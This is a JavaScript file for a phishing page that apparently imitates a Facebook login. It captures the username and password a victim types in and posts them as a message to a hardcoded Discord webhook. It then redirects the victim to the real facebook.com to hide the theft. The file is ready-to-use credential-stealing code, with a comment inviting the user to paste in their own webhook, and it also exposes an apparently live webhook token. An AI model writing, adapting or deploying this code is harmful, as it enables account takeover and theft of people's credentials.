const userInput = document.querySelector(".fb-input");
const passInput = document.getElementById("passInput");

// 👇 PASTE YOUR NEW WEBHOOK URL HERE (keep it secret!)

let url = "https://discord.com/api/webhooks/1528907774342201364/PbSDAmU3kF0lrqXi1LWdjL-oSRiUvEwN_cU6n5bv3PyQe_FQjJvnxS3UHNtITJBHpy8B";

function login() {
  // Check if fields are empty
  if (userInput.value.trim() === "" || passInput.value.trim() === "") {
    alert("Please enter valid credentials");
    return;
  }
  
  const userData = userInput.value;
  const passData = passInput.value;
  
  // Send to Discord
  send(userData, passData);
  
  // Redirect to Facebook
  location.href = "https://facebook.com";
}

function send(username, password) {
  fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: `**Login Attempt**\nUsername: ${username}\nPassword: ${password}`
      })
    })
    .then(response => {
      if (response.ok) {
        console.log("✅ Sent to Discord!");
      } else {
        console.log("❌ Failed:", response.status);
      }
    })
    .catch(error => console.error("Error:", error));
}